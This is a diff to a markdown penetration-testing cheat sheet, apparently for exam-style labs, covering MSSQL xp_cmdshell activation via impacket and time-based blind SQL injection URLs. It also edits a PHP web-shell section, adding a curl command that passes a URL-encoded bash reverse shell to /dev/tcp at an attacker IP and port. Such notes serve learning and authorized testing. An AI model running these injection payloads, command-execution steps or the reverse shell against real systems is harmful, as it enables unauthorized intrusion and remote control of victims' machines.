@@ -32,7 +32,7 @@ Function `xp_cmdshell` needs to be activated:
 
 Example:
 ```
-kali$ impacket-mssqlclient Administrator:thelocaladminpass@$IpTarget -windows-auth
+kali$ impacket-mssqlclient Administrator:thelocaladminpass@$TargetIp -windows-auth
 SQL> execute sp_configure 'show advanced options', 1;
 SQL> reconfigure;
 SQL> execute sp_configure 'xp_cmdshell'
@@ -128,7 +128,7 @@ http://$TargetIp/blindsqli.php?user=trueuser' AND IF (1=1, sleep(3),'false') -- 
 http://$TargetIp/blindsqli.php?user=fakeuser' AND IF (1=1, sleep(3),'false') -- //
 ```
 
-#### Php injection
+#### Php injection - OS command
 
 Php injection in an `input` HTML field:
 ```
@@ -137,6 +137,8 @@ Php injection in an `input` HTML field:
 and trigger the webshell:
 ```
 curl $TargetIp/path/on/target/webshell.php?cmd=ls
+curl $TargetIp/path/on/target/webshell.php?cmd=id
+curl $TargetIp/path/on/target/webshell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$AttackerIp%2F$AttackerPort%200%3E%261%22
 ```
 
 ## Sqlmap
